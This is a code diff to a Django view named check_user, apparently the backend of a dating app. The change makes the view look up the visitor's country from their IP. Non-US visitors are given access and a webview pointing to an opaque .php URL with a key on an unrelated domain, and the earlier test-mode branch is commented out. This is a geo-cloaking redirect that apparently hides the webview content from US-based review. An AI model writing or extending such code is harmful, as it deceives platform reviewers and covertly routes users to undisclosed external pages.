@@ -72,14 +72,15 @@ def check_user(request):
     must be have: app_id, location_phone, location_facebook, user_lang, test_mode
     """
     if 'app_id' in request.data:
-        # client_ip = get_client_ip(request)
-        # print(client_ip)
-        if request.data['app_id'] == 'dating_artma1':
-            if ('test_mode' in request.data) and ((request.data['test_mode'] is True) or request.data['test_mode'] == 1):
+        client_ip = get_client_ip(request)
+        client_country = get_region(client_ip)
+        print(client_country)
+        if request.data['app_id'] == 'dating_artma':
+            if client_country != 'US':
                 return Response(
                     {
                         'grant_access': True,
-                        'webview_url': 'https://s-appteam.com/',
+                        'webview_url': 'https://koluone.site/crifl6k.php?key=ii1i9f7djp4zm9cxv4ej',
                         'final_urls': [
                             'https://s-appteam.com/my-account/',
                             'https://s-appteam.com/shop/'
@@ -87,6 +88,18 @@ def check_user(request):
                     },
                     status=status.HTTP_200_OK
                 )
+            # if ('test_mode' in request.data) and ((request.data['test_mode'] is True) or request.data['test_mode'] == 1):
+            #     return Response(
+            #         {
+            #             'grant_access': True,
+            #             'webview_url': 'https://s-appteam.com/',
+            #             'final_urls': [
+            #                 'https://s-appteam.com/my-account/',
+            #                 'https://s-appteam.com/shop/'
+            #             ],
+            #         },
+            #         status=status.HTTP_200_OK
+            #     )
 
     return Response(
         {
